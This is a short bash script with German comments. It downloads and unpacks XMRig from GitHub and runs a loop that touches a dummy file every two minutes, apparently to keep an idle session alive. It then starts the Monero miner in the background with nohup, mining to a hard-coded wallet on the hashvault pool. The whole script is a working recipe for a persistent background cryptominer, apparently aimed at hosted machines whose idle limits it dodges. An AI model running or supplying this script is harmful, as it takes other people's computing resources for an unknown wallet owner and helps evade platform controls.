#!/bin/bash
# Download und entpacken von XMRig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz | tar -xz

# Wechsel in das entpackte Verzeichnis
cd xmrig-6.20.0

# Keep-Alive-Skript im Hintergrund starten
(while true; do echo "Keep-Alive Aktivität..." && touch ~/dummyfile && sleep 120; done) &

# Starten des Miners im Hintergrund
nohup ./xmrig -o pool.hashvault.pro:3333 -u 45RGGvpgm5Lh1uiAqTCGCDdVuC1fNwoxkb64K6o6M9GNVWoX28a9hzwcYUSr4mZw1WVSv68R64cE45SnV52nSzscK1MCnsJ -p x --tls > xmrig.log 2>&1 &
